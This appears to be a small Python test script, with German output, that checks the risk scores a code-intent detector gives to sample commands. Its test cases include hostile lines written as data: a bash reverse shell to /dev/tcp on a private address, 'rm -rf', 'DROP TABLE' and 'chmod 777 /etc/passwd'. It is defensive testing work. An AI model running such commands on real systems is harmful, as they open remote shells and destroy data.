"""
Quick Test für Score-Berechnung
"""
import sys
from pathlib import Path

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent / "src"))

# Import the function
sys.path.insert(0, str(Path(__file__).parent / "detectors" / "code_intent_service"))
from main import analyze_code_rules

# Test cases
test_cases = [
    ("rm -rf /tmp", 0.9, "Should be high risk"),
    ("DROP TABLE users;", 0.9, "Should be high risk"),
    ("echo 'Hello World'", 0.0, "Should be low risk"),
    ("SELECT * FROM users", 0.0, "Should be low risk"),
    ("bash -i >& /dev/tcp/192.168.1.1/8080", 0.9, "Should be high risk"),
    ("chmod 777 /etc/passwd", 0.7, "Should be medium-high risk"),
]

print("=" * 80)
print("SCORE-BERECHNUNG TEST")
print("=" * 80)
print()

all_passed = True

for text, expected_min, description in test_cases:
    scores, patterns = analyze_code_rules(text)
    risk_score = scores["cybercrime"]
    verdict = "block" if risk_score > 0.5 else "allow"
    
    passed = risk_score >= expected_min if expected_min > 0.5 else risk_score < 0.5
    status = "✓" if passed else "✗"
    
    if not passed:
        all_passed = False
    
    print(f"{status} {text[:50]:<50} | Score: {risk_score:.2f} | Verdict: {verdict:5s} | Patterns: {patterns[:2]}")
    if not passed:
        print(f"  ⚠️  Expected: {'> 0.5' if expected_min > 0.5 else '< 0.5'}, Got: {risk_score:.2f}")

print()
print("=" * 80)
if all_passed:
    print("✓ ALLE TESTS BESTANDEN")
else:
    print("✗ EINIGE TESTS FEHLGESCHLAGEN")
print("=" * 80)
